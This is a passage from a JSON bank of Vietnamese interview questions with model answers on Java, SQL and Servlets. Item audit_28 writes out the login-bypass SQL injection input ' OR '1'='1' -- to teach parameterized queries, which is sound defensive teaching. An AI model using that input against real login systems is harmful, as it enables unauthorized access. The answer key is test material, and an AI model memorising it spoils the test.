        "Cách làm Deep Copy: Tự viết hàm copy constructor, override clone() cấp phát lại con, hoặc dùng Serialization/JSON."
      ],
      "modelAnswer": "1. **Shallow Copy (Sao chép nông)**:\n   - Chỉ sao chép giá trị của các trường nguyên thủy (primitive fields). Đối với các trường tham chiếu đối tượng (object reference), nó chỉ sao chép con trỏ địa chỉ ô nhớ.\n   - Hệ quả: Đối tượng mới và đối tượng cũ cùng trỏ chung vào các đối tượng con bên dưới. Nếu ta sửa thuộc tính của đối tượng con ở bản sao, đối tượng gốc cũng sẽ **bị thay đổi theo**! Mặc định phương thức `Object.clone()` là shallow copy.\n2. **Deep Copy (Sao chép sâu)**:\n   - Sao chép toàn bộ cây đối tượng. Nó tạo ra các đối tượng mới độc lập hoàn toàn cho tất cả các trường tham chiếu bên trong.\n   - Hệ quả: Mọi thay đổi trên bản sao hoàn toàn không ảnh hưởng gì tới bản gốc.\n3. **Cách thực hiện Deep Copy trong Java**:\n   - Dùng **Copy Constructor**: Chủ động `new` lại các đối tượng con bên trong constructor mới.\n   - Override phương thức `clone()` và chủ động gọi `clone()` đệ quy cho các đối tượng phụ thuộc.\n   - Dùng **Serialization / Deserialization** (hoặc thư viện Gson/Jackson): Chuyển object thành JSON string rồi parse ngược lại thành object mới.",
      "seniorTip": "Dùng Gson/Jackson để làm deep copy là câu trả lời thực tế rất được các Tech Lead dự án đánh giá cao vì tính tiện dụng."
    },
    {
      "id": "audit_20",
      "domain": "Java Core",
      "question": "Memory Leak (Rò rỉ bộ nhớ) trong Java là gì khi mà JVM đã có Garbage Collector? Nêu 3 nguyên nhân phổ biến gây Memory Leak?",
      "timeLimitSeconds": 90,
      "keyPoints": [
        "Memory Leak trong Java: Các đối tượng không còn được ứng dụng sử dụng nữa nhưng vẫn bị giữ tham chiếu bởi các GC Roots, khiến Garbage Collector không thể thu hồi.",
        "Nguyên nhân 1: Sử dụng biến static giữ tham chiếu đến tập hợp lớn (Static Collections).",
        "Nguyên nhân 2: Không đóng tài nguyên (Unclosed streams, DB Connection, Socket).",
        "Nguyên nhân 3: Quên override equals() và hashCode() khi đưa object vào HashSet/HashMap, hoặc đăng ký Listener/Event mà không hủy đăng ký (unregistered listeners)."
      ],
      "modelAnswer": "1. **Khái niệm Memory Leak trong Java**:\n   - Nhiều người lầm tưởng có Garbage Collector thì Java không thể bị rò rỉ bộ nhớ. Nhưng thực tế: **Memory Leak xảy ra khi các đối tượng không còn dùng trong logic nghiệp vụ nữa, nhưng vẫn bị neo giữ bởi ít nhất một đường dẫn tham chiếu hợp lệ đến GC Roots**.\n   - Kết quả: Trình dọn rác GC coi đối tượng đó vẫn đang sống nên không dám xóa $\\to$ Bộ nhớ Heap ngày càng phình to cho đến khi ném lỗi **`OutOfMemoryError`**.\n2. **3 Nguyên nhân phổ biến nhất**:\n   - **Biến `static` giữ dữ liệu lớn (Static Collection)**: Vì biến static sống suốt vòng đời của ClassLoader (gần như suốt thời gian chạy app), nếu add dữ liệu vào `static List` hoặc `static Map` mà không bao giờ xóa bớt, dữ liệu đó sẽ không bao giờ được giải phóng.\n   - **Không đóng kết nối tài nguyên (Unclosed Resources)**: Quên đóng `Connection`, `ResultSet`, `InputStream` trong khối `finally` hoặc quên dùng `try-with-resources`. Kết quả là các file descriptor và buffer ở tầng native bị treo mãi.\n   - **Sai lầm với `equals()` và `hashCode()` trong HashSet/HashMap**: Khi thêm đối tượng vào `HashSet`, sau đó thay đổi thuộc tính định danh của đối tượng đó khiến hash thay đổi. Khi gọi `set.remove(obj)`, Set không tìm thấy để xóa, khiến đối tượng nằm lại vĩnh viễn trong bộ nhớ.",
      "seniorTip": "Nhắc đến các công cụ profiler chuyên dụng như VisualVM, JProfiler hoặc Eclipse Memory Analyzer (MAT) để phân tích heap dump."
    },
    {
      "id": "audit_21",
      "domain": "Database & SQL",
      "question": "Phân biệt INNER JOIN, LEFT JOIN, RIGHT JOIN và FULL OUTER JOIN trong SQL? Cho ví dụ thực tế khi nào bắt buộc dùng LEFT JOIN?",
      "timeLimitSeconds": 85,
      "keyPoints": [
        "INNER JOIN: Chỉ lấy các dòng có dữ liệu khớp ở cả 2 bảng (giao điểm).",
        "LEFT JOIN: Lấy tất cả dòng từ bảng trái, bảng phải không có sẽ điền NULL.",
        "RIGHT JOIN: Lấy tất cả dòng từ bảng phải, bảng trái không có điền NULL.",
        "FULL OUTER JOIN: Lấy tất cả từ cả 2 bảng (hợp nhất).",
        "Ví dụ bắt buộc dùng LEFT JOIN: Tìm khách hàng chưa từng mua hàng (WHERE orders.id IS NULL), hoặc hiển thị danh sách phòng ban kèm số nhân viên kể cả phòng chưa có ai."
      ],
      "modelAnswer": "1. **Phân biệt các loại JOIN**:\n   - **`INNER JOIN`**: Trả về tập giao của 2 bảng. Chỉ những bản ghi có giá trị khóa ngoại khớp với khóa chính ở cả hai bên mới xuất hiện trong kết quả.\n   - **`LEFT JOIN` (LEFT OUTER JOIN)**: Giữ lại toàn bộ 100% bản ghi ở bảng bên trái. Với những dòng bên trái không có bản ghi tương ứng ở bảng bên phải, các cột của bảng phải sẽ được điền giá trị `NULL`.\n   - **`RIGHT JOIN`**: Ngược lại với LEFT JOIN, giữ lại toàn bộ bảng bên phải.\n   - **`FULL OUTER JOIN`**: Lấy toàn bộ bản ghi của cả hai bảng, bất kỳ bên nào thiếu dữ liệu thì điền `NULL`.\n2. **Ví dụ thực tế bắt buộc dùng LEFT JOIN**:\n   - Bài toán 1: *\"Lấy danh sách tất cả các Khách hàng kèm tổng số đơn hàng của họ\"*. Nếu dùng INNER JOIN, những khách hàng mới đăng ký chưa mua hàng sẽ bị biến mất khỏi báo cáo! Dùng LEFT JOIN giúp khách chưa mua vẫn hiện ra với số đơn là 0 hoặc NULL.\n   - Bài toán 2: *\"Tìm những sinh viên chưa từng đăng ký môn học nào\"*: `SELECT s.* FROM Student s LEFT JOIN Enrollment e ON s.id = e.student_id WHERE e.course_id IS NULL;`",
      "seniorTip": "Vẽ sơ đồ Venn hình tròn trong đầu để giải thích trực quan và dứt khoát."
    },
    {
      "id": "audit_22",
      "domain": "Database & SQL",
      "question": "Mệnh đề WHERE khác gì HAVING trong SQL? Thứ tự thực thi logic (Logical Execution Order) của câu lệnh SQL là gì?",
      "timeLimitSeconds": 90,
      "keyPoints": [
        "WHERE: Lọc từng dòng đơn lẻ trước khi gom nhóm (GROUP BY). Không dùng được hàm tổng hợp (SUM, COUNT, AVG).",
        "HAVING: Lọc trên các nhóm sau khi đã GROUP BY. Bắt buộc dùng kèm hàm tổng hợp.",
        "Thứ tự thực thi SQL: FROM -> JOIN -> WHERE -> GROUP BY -> HAVING -> SELECT -> DISTINCT -> ORDER BY -> LIMIT."
      ],
      "modelAnswer": "1. **Khác biệt cốt lõi giữa WHERE và HAVING**:\n   - **`WHERE`**: Dùng để lọc các dòng dữ liệu thô (Row-level filter) **TRƯỚC KHI** diễn ra quá trình gom nhóm `GROUP BY`. Trong mệnh đề `WHERE` **tuyệt đối không được sử dụng các hàm tổng hợp (Aggregate Functions)** như `COUNT()`, `SUM()`, `AVG()`.\n   - **`HAVING`**: Dùng để lọc các nhóm dữ liệu (Group-level filter) **SAU KHI** đã gom nhóm `GROUP BY`. Trong `HAVING` thường xuyên áp dụng các hàm tổng hợp để kiểm tra điều kiện trên từng nhóm (ví dụ: `HAVING COUNT(*) > 5`).\n2. **Thứ tự thực thi logic của câu lệnh SQL (Rất hay hỏi)**:\n   Trình tối ưu SQL (Query Optimizer) không chạy theo thứ tự ta viết code, mà chạy theo thứ tự:\n   1. **`FROM` & `JOIN`**: Xác định bảng và kết nối dữ liệu.\n   2. **`WHERE`**: Lọc các dòng thỏa mãn điều kiện cơ bản.\n   3. **`GROUP BY`**: Gom các dòng còn lại thành từng nhóm.\n   4. **`HAVING`**: Lọc loại bỏ các nhóm không đạt tiêu chuẩn.\n   5. **`SELECT`**: Chiết xuất các cột cần lấy (và tính toán alias).\n   6. **`DISTINCT`**: Loại bỏ các dòng trùng lặp.\n   7. **`ORDER BY`**: Sắp xếp kết quả cuối cùng.\n   8. **`LIMIT` / `OFFSET`**: Cắt lấy số lượng dòng cần trả về.",
      "seniorTip": "Nhớ thứ tự này giải thích tại sao không thể dùng bí danh (Alias) ở SELECT trong mệnh đề WHERE."
    },
    {
      "id": "audit_23",
      "domain": "Database & SQL",
      "question": "Index (Chỉ mục) trong cơ sở dữ liệu là gì? Cấu trúc B-Tree Index hoạt động ra sao? Khi nào NÊN và KHÔNG NÊN đánh Index?",
      "timeLimitSeconds": 90,
      "keyPoints": [
        "Index là cấu trúc dữ liệu phụ trợ giúp tăng tốc độ tìm kiếm (SELECT) từ O(N) Table Scan xuống O(log N).",
        "B-Tree Index: Cấu trúc cây cân bằng tự động, các lá chứa con trỏ trỏ đến vị trí vật lý của dòng dữ liệu trên đĩa.",
        "Khi NÊN đánh index: Các cột thường xuyên xuất hiện trong WHERE, JOIN (khóa ngoại), ORDER BY; bảng có dữ liệu lớn (hàng triệu dòng).",
        "Khi KHÔNG NÊN: Bảng có tần suất INSERT/UPDATE/DELETE cực cao; bảng quá nhỏ; cột có độ chọn lọc thấp (Cardinality thấp như giới tính Nam/Nữ)."
      ],
      "modelAnswer": "1. **Khái niệm Index**:\n   - Index tương tự như mục lục ở cuối cuốn sách. Thay vì phải quét toàn bộ bảng từ đầu đến cuối (**Full Table Scan** với độ phức tạp $O(N)$), Database tra cứu trên Index với độ phức tạp **$O(\\log N)$** để lấy ngay vị trí vật lý của dòng dữ liệu.\n2. **Cấu trúc B-Tree Index**:\n   - Đa số RDBMS (MySQL, PostgreSQL, Oracle, SQL Server) dùng cấu trúc cây cân bằng **B-Tree (Balanced Tree)**.\n   - Cây gồm Node gốc (Root), các Node trung gian và Node lá (Leaf). Các khóa được sắp xếp theo thứ tự. Tại Node lá chứa con trỏ địa chỉ ô nhớ (Row ID) trỏ thẳng đến dòng dữ liệu thực tế trên ổ cứng.\n3. **Khi nào NÊN đánh Index**:\n   - Cột thường xuyên dùng để tìm kiếm trong mệnh đề `WHERE`.\n   - Cột dùng làm khóa ngoại để kết nối `JOIN` giữa các bảng.\n   - Cột thường xuyên xuất hiện trong `ORDER BY` hoặc `GROUP BY`.\n   - Bảng có dung lượng dữ liệu lớn và tỉ lệ đọc (Read/SELECT) chiếm đa số (80-90%).\n4. **Khi nào KHÔNG NÊN đánh Index**:\n   - Bảng quá nhỏ (dưới vài trăm dòng, quét toàn bảng còn nhanh hơn tra index).\n   - Bảng có tần suất ghi (**INSERT, UPDATE, DELETE**) liên tục: vì mỗi khi dữ liệu thay đổi, DB bắt buộc phải tính toán và tái cấu trúc lại toàn bộ các cây Index, làm suy giảm hiệu năng ghi nghiêm trọng.\n   - Cột có **độ phân biệt thấp (Low Cardinality)**: Ví dụ cột `gender` chỉ có `Nam`/`Nu`, hay cột trạng thái `true`/`false`. Khi đó Index không mang lại giá trị lọc đáng kể.",
      "seniorTip": "Nêu khái niệm Clustered Index (sắp xếp vật lý của bảng, chỉ có 1) vs Non-Clustered Index (tạo thêm cây riêng, có thể có nhiều)."
    },
    {
      "id": "audit_24",
      "domain": "Database & SQL",
      "question": "Giải thích 4 tính chất ACID của một Transaction (Giao dịch) trong cơ sở dữ liệu?",
      "timeLimitSeconds": 85,
      "keyPoints": [
        "A - Atomicity (Tính nguyên tử): Tất cả hoặc không có gì (All or Nothing). Một bước lỗi thì rollback toàn bộ.",
        "C - Consistency (Tính nhất quán): Dữ liệu trước và sau transaction phải tuân thủ mọi ràng buộc toàn vẹn (constraints, khóa ngoại).",
        "I - Isolation (Tính cô lập): Các transaction chạy đồng thời không được can thiệp hoặc nhìn thấy trạng thái dở dang của nhau.",
        "D - Durability (Tính bền vững): Một khi đã commit thành công, dữ liệu phải được lưu vĩnh viễn trên đĩa kể cả khi sập nguồn."
      ],
      "modelAnswer": "ACID là 4 tiêu chuẩn vàng đảm bảo tính tin cậy của giao dịch cơ sở dữ liệu:\n1. **Atomicity (Tính nguyên tử - \"Tất cả hoặc không gì cả\")**:\n   - Một transaction gồm nhiều câu lệnh SQL phải được coi như một đơn vị công việc duy nhất. Hoặc là **tất cả câu lệnh đều thành công**, hoặc nếu có bất kỳ 1 lệnh nào thất bại, toàn bộ hệ thống phải được phục hồi về trạng thái ban đầu (**Rollback**).\n   - Ví dụ: Chuyển tiền từ tài khoản A sang B gồm 2 lệnh: trừ tiền A và cộng tiền B. Không thể có chuyện trừ tiền A xong mà máy chủ tắt khiến tiền B không được cộng.\n2. **Consistency (Tính nhất quán)**:\n   - Dữ liệu trước khi giao dịch bắt đầu và sau khi giao dịch kết thúc phải luôn ở trạng thái hợp lệ, không vi phạm bất kỳ ràng buộc nào (Primary key, Foreign key, Check, Trigger).\n   - Ví dụ: Tổng số tiền của A và B trước và sau khi chuyển khoản phải bảo toàn bằng nhau.\n3. **Isolation (Tính cô lập)**:\n   - Đảm bảo các giao dịch chạy đồng thời độc lập với nhau. Một transaction đang chạy không thể nhìn thấy dữ liệu dở dang chưa được commit của transaction khác, tránh hiện tượng xung đột dữ liệu.\n4. **Durability (Tính bền vững)**:\n   - Một khi transaction đã phát lệnh `COMMIT` thành công, các thay đổi dữ liệu được ghi vĩnh viễn xuống đĩa cứng (thông qua Write-Ahead Logging - WAL). Dù hệ thống có bị mất điện đột ngột ngay sau đó, dữ liệu vẫn không bị mất khi khởi động lại.",
      "seniorTip": "Dẫn chứng kịch bản chuyển tiền ngân hàng để giải thích cả 4 chữ cái là cách thuyết phục nhất."
    },
    {
      "id": "audit_25",
      "domain": "Database & SQL",
      "question": "Phân biệt 3 hiện tượng đọc dữ liệu sai lệch: Dirty Read, Non-Repeatable Read và Phantom Read? Các cấp độ Isolation Level tương ứng?",
      "timeLimitSeconds": 90,
      "keyPoints": [
        "Dirty Read: Transaction A đọc dữ liệu mà Transaction B vừa sửa nhưng CHƯA COMMIT. Sau đó B rollback -> A đọc phải dữ liệu rác.",
        "Non-Repeatable Read: Transaction A đọc 1 dòng dữ liệu 2 lần trong cùng transaction nhưng kết quả khác nhau vì Transaction B đã UPDATE dòng đó giữa 2 lần đọc.",
        "Phantom Read: Transaction A chạy câu query đếm/lấy danh sách 2 lần nhưng lần 2 thấy xuất hiện thêm các dòng mới (bóng ma) do Transaction B đã INSERT thêm dòng mới.",
        "4 Cấp độ: Read Uncommitted < Read Committed < Repeatable Read < Serializable."
      ],
      "modelAnswer": "1. **3 Hiện tượng sai lệch khi chạy đồng thời**:\n   - **Dirty Read (Đọc rác)**: Transaction 1 sửa một dòng dữ liệu nhưng **chưa commit**. Transaction 2 nhảy vào đọc được giá trị mới này. Ngay sau đó Transaction 1 bị lỗi và Rollback về giá trị cũ. Kết quả là Transaction 2 đã xử lý trên một dữ liệu \"ma\" chưa từng tồn tại chính thức.\n   - **Non-Repeatable Read (Đọc không lặp lại được)**: Trong cùng 1 transaction, Transaction 1 đọc dòng dữ liệu X (ví dụ số dư là 100). Sau đó Transaction 2 vào `UPDATE` số dư thành 200 và `COMMIT`. Khi Transaction 1 đọc lại dòng X lần thứ hai, nó thấy số dư đổi thành 200 (kết quả đọc 2 lần khác nhau trên cùng 1 dòng).\n   - **Phantom Read (Đọc bóng ma)**: Transaction 1 chạy câu lệnh `SELECT COUNT(*) FROM Users WHERE age > 18` được 10 dòng. Transaction 2 chạy lệnh `INSERT` thêm một user 20 tuổi và `COMMIT`. Khi Transaction 1 chạy lại câu query trên, nó thấy kết quả nhảy lên 11 dòng (dòng mới xuất hiện như bóng ma).\n2. **4 Cấp độ cô lập (Transaction Isolation Levels)**:\n   - **`READ UNCOMMITTED`**: Thấp nhất, cho phép Dirty Read, Non-Repeatable Read, Phantom Read.\n   - **`READ COMMITTED`** (Mặc định ở Oracle, Postgres, SQL Server): Chống được Dirty Read; vẫn có thể bị Non-Repeatable Read và Phantom Read.\n   - **`REPEATABLE READ`** (Mặc định ở MySQL InnoDB): Chống được Dirty Read và Non-Repeatable Read.\n   - **`SERIALIZABLE`**: Cao nhất và an toàn nhất, khóa toàn bộ tài nguyên để chạy tuần tự, chống được cả 3 hiện tượng nhưng hiệu năng chậm nhất.",
      "seniorTip": "Vẽ bảng ma trận giữa 4 cấp độ và 3 hiện tượng để thể hiện tư duy hệ thống."
    },
    {
      "id": "audit_26",
      "domain": "Database & SQL",
      "question": "Phân biệt DELETE, TRUNCATE và DROP trong SQL?",
      "timeLimitSeconds": 75,
      "keyPoints": [
        "DELETE: Lệnh DML, xóa từng dòng theo điều kiện WHERE, có thể ROLLBACK được, chạy chậm, sinh log nhiều, không reset auto-increment.",
        "TRUNCATE: Lệnh DDL, xóa toàn bộ bảng cực nhanh bằng cách hủy phân vùng dữ liệu (deallocate data pages), reset auto-increment về 1, không có WHERE.",
        "DROP: Lệnh DDL, xóa toàn bộ bảng bao gồm cả cấu trúc, dữ liệu, index và trigger biến mất vĩnh viễn khỏi DB."
      ],
      "modelAnswer": "So sánh chi tiết 3 lệnh xóa dữ liệu:\n1. **`DELETE`** (Data Manipulation Language - DML):\n   - Dùng để xóa một số dòng hoặc toàn bộ dòng trong bảng thông qua mệnh đề `WHERE`.\n   - Hoạt động bằng cách quét từng dòng, xóa và ghi lại nhật ký giao dịch (Transaction Log) cho từng dòng một. Do đó tốc độ **chậm nhất** đối với bảng lớn.\n   - **Có thể Rollback** nếu nằm trong Transaction. Không làm reset giá trị của cột tự tăng (Auto-Increment Identity).\n2. **`TRUNCATE`** (Data Definition Language - DDL):\n   - Dùng để xóa sạch toàn bộ dữ liệu trong bảng một cách siêu tốc.\n   - Cơ chế: Không quét từng dòng mà giải phóng trực tiếp toàn bộ các trang dữ liệu (Data Pages) của bảng trên đĩa cứng và chỉ ghi một log tối thiểu. Tốc độ **nhanh hơn DELETE hàng trăm lần**.\n   - **Reset cột tự tăng về giá trị ban đầu (thường là 1)**. Không hỗ trợ mệnh đề `WHERE`.\n3. **`DROP`** (Data Definition Language - DDL):\n   - Xóa bỏ **hoàn toàn bảng khỏi cơ sở dữ liệu** (cả cấu trúc bảng, dữ liệu, chỉ mục index, quyền hạn, trigger liên quan đều bị xóa sổ vĩnh viễn).\n   - Sau lệnh DROP, bảng không còn tồn tại trong Schema, muốn dùng lại phải `CREATE TABLE` từ đầu.",
      "seniorTip": "Nhắc thêm việc TRUNCATE sẽ bị chặn nếu bảng đang được tham chiếu bởi khóa ngoại (Foreign Key) của bảng khác."
    },
    {
      "id": "audit_27",
      "domain": "Database & SQL",
      "question": "Khóa chính (Primary Key), Khóa ngoại (Foreign Key) và Ràng buộc duy nhất (Unique Constraint) khác nhau như thế nào?",
      "timeLimitSeconds": 80,
      "keyPoints": [
        "Primary Key: Định danh duy nhất cho mỗi dòng, bắt buộc NOT NULL, mỗi bảng chỉ có DUY NHẤT 1 khóa chính (tự động tạo Clustered Index).",
        "Unique Constraint: Đảm bảo giá trị cột không bị trùng lặp, cho phép chứa giá trị NULL (MySQL cho phép nhiều NULL, SQL Server chỉ cho 1 NULL), 1 bảng có thể có NHIỀU Unique keys.",
        "Foreign Key: Ràng buộc toàn vẹn tham chiếu nối tới Primary Key của bảng khác, ngăn chặn việc tạo dữ liệu mồ côi."
      ],
      "modelAnswer": "1. **Khóa chính (`PRIMARY KEY`)**:\n   - Là một hoặc một nhóm cột dùng để **định danh duy nhất một bản ghi** trong bảng.\n   - Quy tắc bắt buộc: Giá trị phải là duy nhất và **TUYỆT ĐỐI KHÔNG ĐƯỢC CHỨA `NULL`**.\n   - Mỗi bảng chỉ có **duy nhất 1 Primary Key** (mặc định hầu hết RDBMS sẽ tạo một Clustered Index dựa trên khóa này).\n2. **Ràng buộc duy nhất (`UNIQUE KEY`)**:\n   - Đảm bảo dữ liệu trong cột không bị trùng lặp giữa các dòng (ví dụ: `email`, `phone`, `citizen_id`).\n   - Khác biệt với Primary Key: **Cho phép chứa giá trị `NULL`** và một bảng có thể có **nhiều Unique Key** khác nhau (RDBMS sẽ tạo Non-clustered Index cho các cột này).\n3. **Khóa ngoại (`FOREIGN KEY`)**:\n   - Là cột trong một bảng trỏ tới cột Khóa chính (hoặc Unique key) của một bảng khác nhằm thiết lập mối quan hệ giữa hai bảng.\n   - Mục đích: Đảm bảo **Tính toàn vẹn tham chiếu (Referential Integrity)**, ngăn chặn việc chèn mã không tồn tại ở bảng cha và ngăn việc xóa một dòng ở bảng cha khi đang có bảng con tham chiếu đến (trừ khi có cấu hình `ON DELETE CASCADE`).",
      "seniorTip": "Nêu sự khác biệt thú vị: Trong SQL Server, Unique chỉ cho phép 1 giá trị NULL; nhưng trong MySQL/Postgres cho phép nhiều dòng NULL vì NULL != NULL."
    },
    {
      "id": "audit_28",
      "domain": "Database & SQL",
      "question": "SQL Injection là gì? Nêu cơ chế tấn công và cách phòng chống triệt để bằng PreparedStatement trong JDBC?",
      "timeLimitSeconds": 90,
      "keyPoints": [
        "SQL Injection (SQLi) là kỹ thuật tấn công chèn các đoạn mã SQL độc hại vào input của người dùng để can thiệp vào câu truy vấn của cơ sở dữ liệu.",
        "Ví dụ kinh điển: Nhập username là \"' OR '1'='1' --\" làm vô hiệu hóa điều kiện mật khẩu.",
        "Nguyên nhân: Sử dụng nối chuỗi String concatenation trong Statement thường.",
        "Giải pháp triệt để: Sử dụng PreparedStatement (Parameterized Queries). PreparedStatement biên dịch trước cây cú pháp (Pre-compiled), input được xử lý thuần túy là dữ liệu (Literal), không thể làm thay đổi cấu trúc câu lệnh."
      ],
      "modelAnswer": "1. **Bản chất của SQL Injection**:\n   - Là lỗ hổng bảo mật xếp hạng đầu bảng OWASP. Xảy ra khi lập trình viên ghép nối chuỗi trực tiếp từ dữ liệu người dùng nhập vào câu truy vấn SQL: `String sql = \"SELECT * FROM users WHERE user='\" + inputUser + \"' AND pass='\" + inputPass + \"';\";`\n   - Nếu hacker nhập `inputUser` là `' OR '1'='1' -- `, câu SQL bị biến thành:\n     `SELECT * FROM users WHERE user='' OR '1'='1' -- ...`\n     Vì `'1'='1'` luôn đúng và dấu `--` biến phần kiểm tra password thành chú thích, hacker đăng nhập thành công vào hệ thống mà không cần mật khẩu!\n2. **Cách phòng chống bằng `PreparedStatement`**:\n   - Thay vì nối chuỗi, ta dùng dấu hỏi chấm (`?`): `SELECT * FROM users WHERE user = ? AND pass = ?`\n   - **Cơ chế bảo vệ**: Khi dùng `PreparedStatement`, cơ sở dữ liệu sẽ **biên dịch trước (Pre-compile)** cấu trúc ngữ nghĩa của câu lệnh SQL trước khi đưa tham số vào.\n   - Khi gọi `pstmt.setString(1, inputUser)`, driver DB sẽ đóng gói toàn bộ chuỗi của hacker dưới dạng một **giá trị thuần túy (Data Literal)** và tự động escape các ký tự nguy hiểm. Ký tự `'` hay `OR` của hacker chỉ được hiểu là nội dung tên người dùng, hoàn toàn không thể làm thay đổi cây cú pháp logic của câu lệnh!",
      "seniorTip": "Nhắc thêm việc ORM như Hibernate/JPA mặc định dùng Parameterized queries nên cũng chống được SQL Injection (trừ khi cố tình nối chuỗi trong HQL/JPQL)."
    },
    {
      "id": "audit_29",
      "domain": "Database & SQL",
      "question": "Cơ chế Connection Pool trong Java (HikariCP, Tomcat Pool) hoạt động như thế nào? Tại sao không nên mở kết nối DriverManager.getConnection() mỗi khi có request?",
      "timeLimitSeconds": 85,
      "keyPoints": [
        "Mỗi lần mở kết nối DB (DriverManager.getConnection) tốn chi phí cực lớn: Bắt tay 3 bước TCP, xác thực tài khoản, cấp phát bộ nhớ socket ở cả client và DB server (tốn hàng trăm ms).",
        "Connection Pool duy trì sẵn một nhóm các kết nối DB đang hoạt động (Active connections) trong bộ nhớ.",
        "Khi request cần: mượn connection từ pool -> chạy query -> gọi conn.close() thì connection KHÔNG BỊ HỦY mà chỉ được trả về lại pool.",
        "HikariCP là connection pool nhanh và phổ biến nhất hiện nay trong Spring Boot."
      ],
      "modelAnswer": "1. **Tác hại của việc mở kết nối thủ công (`DriverManager`)**:\n   - Để thiết lập một kết nối mới tới DB, máy chủ phải trải qua quá trình rất nặng nề: Bắt tay 3 bước TCP network, thương lượng mã hóa SSL, xác thực user/password, và DB Server phải cấp phát một process/thread riêng cùng bộ nhớ đệm cho session đó. Quá trình này mất từ 100ms - 500ms.\n   - Nếu trang web có 1000 người truy cập đồng thời mà mỗi người đều mở một kết nối mới, DB Server sẽ cạn kiệt RAM, CPU quá tải và sập toàn bộ hệ thống.\n2. **Cơ chế hoạt động của Connection Pool**:\n   - Connection Pool (như **HikariCP**, **Tomcat JDBC Pool**) là một bộ quản lý bộ nhớ đệm kết nối. Khi ứng dụng khởi động, nó tự động mở sẵn một số lượng kết nối nhất định (ví dụ `minimum-idle = 10`, `maximum-pool-size = 30`) và duy trì chúng sống liên tục.\n   - Khi một luồng người dùng cần truy vấn DB, nó chỉ mất vài micro-giây để **\"mượn\" (borrow)** một kết nối rảnh rỗi từ Pool.\n   - Khi thực thi xong, code gọi phương thức `conn.close()`. Thực chất đối tượng Connection của Pool đã được bọc lại (Proxy pattern): lệnh `.close()` **KHÔNG ĐÓNG KẾT NỐI VẬT LÝ**, mà chỉ đơn thuần dọn dẹp trạng thái và **hoàn trả kết nối trở lại vào Pool** để người khác tái sử dụng ngay lập tức.",
      "seniorTip": "Nêu tên HikariCP - thư viện mặc định trong Spring Boot nổi tiếng với tốc độ microsecond và byte-code optimization."
    },
    {
      "id": "audit_30",
      "domain": "Database & SQL",
      "question": "Stored Procedure và Function trong SQL khác nhau như thế nào? Khi nào nên dùng Stored Procedure thay vì viết code ở tầng Backend Java?",
      "timeLimitSeconds": 80,
      "keyPoints": [
        "Stored Procedure: Dùng để thực thi chuỗi tác vụ nghiệp vụ, có thể trả về 0, 1 hoặc nhiều giá trị (qua OUT parameter), có thể gọi DDL/DML, quản lý Transaction.",
        "Function: Thiết kế để tính toán và BẮT BUỘC trả về duy nhất 1 giá trị (hoặc Table), chỉ dùng trong SELECT, không được chứa lệnh INSERT/UPDATE/DELETE gây thay đổi trạng thái DB (Side-effects).",
        "Ưu điểm Stored Procedure: Giảm tải network traffic (xử lý dữ liệu lớn tại chỗ), tận dụng execution plan cache.",
        "Nhược điểm: Khó scale out (DB là nút thắt cổ chai), khó debug và version control so với code Java."
      ],
      "modelAnswer": "1. **So sánh Stored Procedure và Function trong SQL**:\n   - **Giá trị trả về**: `Function` **bắt buộc phải trả về một giá trị** duy nhất (Scalar value) hoặc một bảng (Table-valued). `Stored Procedure` không bắt buộc trả về giá trị (có thể trả về void, hoặc trả về nhiều kết quả thông qua các tham số `OUT`).\n   - **Cách gọi**: `Function` có thể được gọi nhúng trực tiếp trong các câu lệnh `SELECT`, `WHERE`, `HAVING` (ví dụ `SELECT dbo.calculateAge(dob) FROM User`). `Stored Procedure` phải được gọi độc lập bằng lệnh `EXEC` hoặc `CALL`.\n   - **Thay đổi trạng thái (Side-effects)**: `Function` thường chỉ được đọc dữ liệu (không được phép chạy `INSERT`, `UPDATE`, `DELETE` làm thay đổi dữ liệu của bảng). `Stored Procedure` được toàn quyền chạy mọi lệnh DML, DDL và quản lý cả `COMMIT`/`ROLLBACK` transaction.\n2. **Khi nào nên dùng Stored Procedure thay vì viết code Java**:\n   - Khi cần xử lý **dữ liệu quy mô cực lớn (Batch processing)**: Ví dụ tính toán tổng kết doanh số cuối ngày cho 10 triệu bản ghi. Nếu kéo 10 triệu dòng về tầng Java để tính thì sẽ làm nghẽn băng thông mạng; chạy Stored Procedure sẽ xử lý trực tiếp tại chỗ trên server DB và chỉ trả về một vài con số tổng hợp.\n   - **Bảo mật**: Cho phép gán quyền cho user chỉ được chạy procedure mà không cho phép truy cập trực tiếp vào bảng nhạy cảm.",
      "seniorTip": "Nhắc thêm về nhược điểm: Logic nằm trong Stored Procedure rất khó viết Unit Test tự động và khó scale theo kiến trúc Microservices."
    },
    {
      "id": "audit_31",
      "domain": "JavaWeb",
      "question": "Trình bày vòng đời (Lifecycle) của Servlet trong Servlet Container (Tomcat)? Servlet là đơn luồng hay đa luồng?",
      "timeLimitSeconds": 90,
      "keyPoints": [
        "3 Giai đoạn vòng đời: init() -> service() -> destroy().",
        "init(ServletConfig config): Chỉ chạy 1 LẦN DUY NHẤT khi Servlet được tải vào bộ nhớ (lúc khởi động server hoặc lúc có request đầu tiên).",
        "service(request, response): Chạy MỖI KHI có request đến, điều phối sang doGet(), doPost()...",
        "destroy(): Chạy 1 LẦN DUY NHẤT khi container tắt hoặc reload ứng dụng để giải phóng tài nguyên.",
        "Servlet là ĐƠN INSTANCE - ĐA LUỒNG (Single Instance - Multi-threaded): 1 đối tượng Servlet duy nhất phục vụ đồng thời hàng ngàn request trên các Thread khác nhau -> Không được dùng instance variable để lưu trạng thái request!"
      ],
      "modelAnswer": "1. **Vòng đời của Servlet gồm 3 giai đoạn chính**:\n   - **Nạp và khởi tạo (`init()`)**: Khi có request đầu tiên (hoặc khi khởi động server nếu có thẻ `<load-on-startup>`), Servlet Container (Tomcat) nạp class Servlet, tạo **duy nhất 1 instance** và gọi phương thức `init(ServletConfig config)`. Phương thức này **chỉ chạy 1 lần duy nhất** trong suốt vòng đời để khởi tạo cấu hình, kết nối DB.\n   - **Xử lý yêu cầu (`service()`)**: Mỗi khi có một HTTP request gửi đến URL tương ứng, Container sẽ cấp phát một luồng (**Thread**) mới và gọi phương thức `service(HttpServletRequest, HttpServletResponse)`. Dựa vào phương thức HTTP (GET, POST, PUT), hàm `service()` sẽ điều phối đến các phương thức tương ứng như `doGet()` hoặc `doPost()`.\n   - **Tiêu hủy (`destroy()`)**: Khi Web Container tắt hoặc ứng dụng bị gỡ bỏ (undeploy), phương thức `destroy()` được gọi **1 lần duy nhất** để đóng các kết nối mở, giải phóng tài nguyên. Sau đó instance bị GC thu hồi.\n2. **Servlet 